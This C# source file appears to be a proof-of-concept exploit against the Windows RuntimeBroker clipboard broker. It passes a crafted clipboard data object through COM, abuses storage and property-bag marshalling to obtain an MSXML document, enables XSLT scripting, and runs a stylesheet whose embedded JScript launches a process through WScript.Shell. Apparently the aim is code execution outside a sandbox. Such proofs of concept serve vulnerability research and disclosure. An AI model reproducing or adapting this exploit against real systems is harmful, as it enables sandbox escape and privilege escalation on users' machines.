using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace RuntimeBroker
{
    [ComVisible(true), Guid("6040ec14-6557-41f9-a3f7-b1cab7b42120"), InterfaceType(ComInterfaceType.InterfaceIsIInspectable)]
    interface IRuntimeBroker
    {
        void ActivateInstance(/* Stack Offset: 8 */ [In, MarshalAs(UnmanagedType.LPWStr)] string p0, 
            /* Stack Offset: 16 */ [Out, MarshalAs(UnmanagedType.IUnknown)] out object p1);
        void GetActivationFactory(/* Stack Offset: 8 */ [In, MarshalAs(UnmanagedType.LPWStr)] string p0, /* Stack Offset: 16 */ [In] ref Guid p1, 
            /* Stack Offset: 24 */ [Out, MarshalAs(UnmanagedType.IInspectable)] /* iid_is param offset: 16 */ out object p2);
        void SetErrorFlags(/* Stack Offset: 8 */ [In] int p0);
        void GetErrorFlags(/* Stack Offset: 8 */ [Out] out int p0);
        void DebuggerAddRef();
        void DebuggerRelease();
        void GetClipboardBroker(/* Stack Offset: 8 */ [Out, MarshalAs(UnmanagedType.IUnknown)] out object broker);
    }

    [ComVisible(true), Guid("c76c0834-6556-435e-903c-8c0a33484afa"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IRunAsClipboard
    {
        void Proc3();
    }

    [ComVisible(true), Guid("b6fb7c7c-0bb2-4c59-b866-d6b153521af6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IImpersonateClipboardOwner
    {
        void Proc3(/* Stack Offset: 8 */ [In] IRunAsClipboard p0);
    }

    //OLD IID
    //[ComVisible(true), Guid("e9df6551-d69b-41d9-9dae-91d534251026"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComVisible(true), Guid("AC57CAFF-E1CB-4325-8D0A-0DA256C83284"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IClipboardBroker
    {
        void SetClipboard(/* Stack Offset: 8 */ [In] IDataObject p0);
        void GetClipboard(/* Stack Offset: 8 */ [Out] out IDataObject p0, /* Stack Offset: 16 */ [Out] out int p1);
        void FlushClipboard();
        void IsCurrentClipboard(/* Stack Offset: 8 */ [In] IDataObject p0);
        void GetExternalReference(/* Stack Offset: 8 */ [Out] out IClipboardBroker p0);
        void ValidateAndAcquireACImpersonationSource(/* Stack Offset: 8 */ [In] IDataObject p0, /* Stack Offset: 16 */ [Out] out IImpersonateClipboardOwner p1);
        void SetClipboardEnterpriseId(/* Stack Offset: 8 */ [In] [MarshalAs(UnmanagedType.LPWStr)] string p0);
        void GetClipboardEnterpriseId(/* Stack Offset: 8 */ [Out] [MarshalAs(UnmanagedType.LPWStr)] out string p0);
    }

    [ComImport, Guid("0000000B-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IStorage
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        IStream CreateStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2);
        [return: MarshalAs(UnmanagedType.Interface)]
        IStream OpenStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr reserved1, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved2);
        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage CreateStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2);
        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage OpenStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr pstgPriority, [In, MarshalAs(UnmanagedType.U4)] int grfMode, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.U4)] int reserved);
        void CopyTo(int ciidExclude, [In, MarshalAs(UnmanagedType.LPArray)] Guid[] pIIDExclude, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest);
        void MoveElementTo([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName, [In, MarshalAs(UnmanagedType.U4)] int grfFlags);
        void Commit(int grfCommitFlags);
        void Revert();
        void EnumElements([In, MarshalAs(UnmanagedType.U4)] int reserved1, IntPtr reserved2, [In, MarshalAs(UnmanagedType.U4)] int reserved3, [MarshalAs(UnmanagedType.Interface)] out object ppVal);
        void DestroyElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsName);
        void RenameElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsOldName, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName);
        void SetElementTimes([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In] System.Runtime.InteropServices.ComTypes.FILETIME pctime, [In] System.Runtime.InteropServices.ComTypes.FILETIME patime, [In] System.Runtime.InteropServices.ComTypes.FILETIME pmtime);
        void SetClass([In] ref Guid clsid);
        void SetStateBits(int grfStateBits, int grfMask);
        void Stat([Out] System.Runtime.InteropServices.ComTypes.STATSTG pStatStg, int grfStatFlag);
    }

    [StructLayout(LayoutKind.Sequential)]
    class PROPVARIANT
    {
        const ushort VT_UNKNOWN = 13;
        ushort vt;
        ushort wReserved1;
        ushort wReserved2;
        ushort wReserved3;
        IntPtr pUnknown;

        public PROPVARIANT(object obj)
        {
            vt = VT_UNKNOWN;
            pUnknown = Marshal.GetIUnknownForObject(obj);
        }

        public PROPVARIANT()
        {
            vt = VT_UNKNOWN;
        }

        public object ToObject()
        {
            return Marshal.GetObjectForIUnknown(pUnknown);
        }
    }

    [ComImport, ComVisible(true)]
    [Guid("55272A00-42CB-11CE-8135-00AA004BB851")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPropertyBag
    {
        void Read([In] string propName, [In, Out] PROPVARIANT ptrVar, IntPtr errorLog);
        void Write([In] string propName, [In, Out] PROPVARIANT ptrVar);
    }

    [ComImport, Guid("00000109-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IPersistStream
    {
        void GetClassID(out Guid clsid);
        int IsDirty();
        void Load(IStream pStm);
        void Save(IStream pStm, bool fClearDirty);
        void GetSizeMax(out ulong pcbSize);
    }

    [ComVisible(true)]
    class FakeObject : IPersistStream
    {
        public void GetClassID(out Guid clsid)
        {
            Console.WriteLine("GetClassID");
            //MSXML.DOMDocument.6.0
            clsid = new Guid("88D96A05-F192-11D4-A65F-0040963251E5");
        }

        public void GetSizeMax(out ulong pcbSize)
        {
            Console.WriteLine("GetSizeMax");
            pcbSize = 1024;
        }

        public int IsDirty()
        {
            Console.WriteLine("IsDirty");
            return 0;
        }

        public void Load(IStream pStm)
        {
            Console.WriteLine("Load");
        }

        public void Save(IStream pStm, bool fClearDirty)
        {
            Console.WriteLine("Save");
            byte[] arr = Encoding.ASCII.GetBytes("<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' xmlns:msxsl='urn:schemas-microsoft-com:xslt' xmlns:user='http://mycompany.com/mynamespace'> <msxsl:script language='JScript' implements-prefix='user'> function xml(nodelist) { var o = new ActiveXObject('WScript.Shell'); o.Exec('notepad'); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match='/'> <xsl:value-of select='user:xml(.)'/> </xsl:template> </xsl:stylesheet>");
            pStm.Write(arr, arr.Length, IntPtr.Zero);
            Console.WriteLine("Done Write");
        }
    }

    [ComVisible(true)]
    class DataObject : IDataObject
    {
        [DllImport("shell32.dll")]
        static extern int SHCreateStdEnumFmtEtc(
              int cfmt,
              FORMATETC[] afmt,
              out IEnumFORMATETC ppenumFormatEtc
            );

        public int DAdvise(ref FORMATETC pFormatetc, ADVF advf, IAdviseSink adviseSink, out int connection)
        {
            Console.WriteLine("DAdvise");
            throw new NotImplementedException();
        }

        public void DUnadvise(int connection)
        {
            Console.WriteLine("DUnadvise");
            throw new NotImplementedException();
        }

        public int EnumDAdvise(out IEnumSTATDATA enumAdvise)
        {
            Console.WriteLine("EnumDAdvise");
            throw new NotImplementedException();
        }

        public IEnumFORMATETC EnumFormatEtc(DATADIR direction)
        {
            Console.WriteLine("EnumFormatEtc");
            FORMATETC fmt = new FORMATETC();
            fmt.tymed = TYMED.TYMED_ISTORAGE;
            fmt.cfFormat = 1;
            fmt.dwAspect = DVASPECT.DVASPECT_CONTENT;
            fmt.lindex = -1;
            FORMATETC[] fmts = new FORMATETC[] { fmt };
            IEnumFORMATETC e;
            int hr = SHCreateStdEnumFmtEtc(1, fmts, out e);
            if (hr != 0)
            {
                Marshal.ThrowExceptionForHR(hr);
            }
            return e;
        }

        public int GetCanonicalFormatEtc(ref FORMATETC formatIn, out FORMATETC formatOut)
        {
            Console.WriteLine("GetCanonicalFormatEtc");
            throw new NotImplementedException();
        }

        public void GetData(ref FORMATETC format, out STGMEDIUM medium)
        {
            throw new NotImplementedException();
        }

        private bool _setclipboard;

        public void GetDataHere(ref FORMATETC format, ref STGMEDIUM medium)
        {
            try
            {
                Console.WriteLine("GetDataHere {0} {1:X}", medium.tymed, Marshal.ReadIntPtr(medium.unionmember).ToInt64());
                if (_setclipboard && medium.tymed == TYMED.TYMED_ISTORAGE)
                {
                    IStorage stg = (IStorage)Marshal.GetObjectForIUnknown(medium.unionmember);
                    IStorage new_stg = stg.CreateStorage("TestStorage", 2 | 0x1000 | 0x10, 0, 0);
                    Console.WriteLine("new_stg: {0}", new_stg);
                    IPropertyBag bag = (IPropertyBag)new_stg;
                    Console.WriteLine("Bag: {0}", bag);
                    object o = new FakeObject();
                    PROPVARIANT var = new PROPVARIANT(o);
                    bag.Write("X", var);
                    new_stg.Commit(0);
                    Marshal.ReleaseComObject(bag);
                    Marshal.ReleaseComObject(new_stg);
                    new_stg = stg.OpenStorage("TestStorage", IntPtr.Zero, 0x12, IntPtr.Zero, 0);
                    bag = (IPropertyBag)new_stg;
                    var = new PROPVARIANT();
                    bag.Read("X", var, IntPtr.Zero);
                    dynamic doc = var.ToObject();
                    Console.WriteLine("Done Read {0}", doc);
                    doc.setProperty("AllowXsltScript", true);
                    doc.transformNode(doc);
                    _setclipboard = false;
                    Environment.Exit(1);
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine("GetDataHere: {0}", ex);
                Environment.Exit(1);
            }
            throw new NotImplementedException();
            
        }

        public int QueryGetData(ref FORMATETC format)
        {
            Console.WriteLine("QueryGetData");
            throw new NotImplementedException();
        }

        public void SetData(ref FORMATETC formatIn, ref STGMEDIUM medium, bool release)
        {
            Console.WriteLine("SetData");
            throw new NotImplementedException();
        }

        public void SetClipboardDone()
        {
            _setclipboard = true;
        }
    }

    class Program
    {
        [DllImport("ole32.dll")]
        static extern int CoInitializeSecurity(
                IntPtr pSecDesc,
                int cAuthSvc,
                IntPtr asAuthSvc,
                IntPtr pReserved1,
                int dwAuthnLevel,
                int dwImpLevel,
                IntPtr pAuthList,
                int dwCapabilities,
                IntPtr pReserved3
                );

        static void Main(string[] args)
        {
            try
            {
                int hr = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero,
                        0, 3, IntPtr.Zero, 0, IntPtr.Zero);
                if (hr != 0)
                {
                    Marshal.ThrowExceptionForHR(hr);
                }
                Type t = Type.GetTypeFromCLSID(new Guid("D63B10C5-BB46-4990-A94F-E40B9D520160"));
                IRuntimeBroker broker = (IRuntimeBroker)Activator.CreateInstance(t);
                object clipboard_broker;
                broker.GetClipboardBroker(out clipboard_broker);
                Console.WriteLine(clipboard_broker);
                IClipboardBroker clipboard = (IClipboardBroker)clipboard_broker;
                DataObject obj = new DataObject();
                clipboard.SetClipboard(obj);
                Console.WriteLine("SetClipboard Complete");
                obj.SetClipboardDone();
                IDataObject da;
                int sequence;
                clipboard.GetClipboard(out da, out sequence);
                FORMATETC fmt = new FORMATETC();
                fmt.tymed = TYMED.TYMED_ISTORAGE;
                fmt.cfFormat = 1;
                fmt.dwAspect = DVASPECT.DVASPECT_CONTENT;
                fmt.lindex = -1;

                STGMEDIUM stg = new STGMEDIUM();

                da.GetData(ref fmt, out stg);
                Console.WriteLine("GetClipboard Complete");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
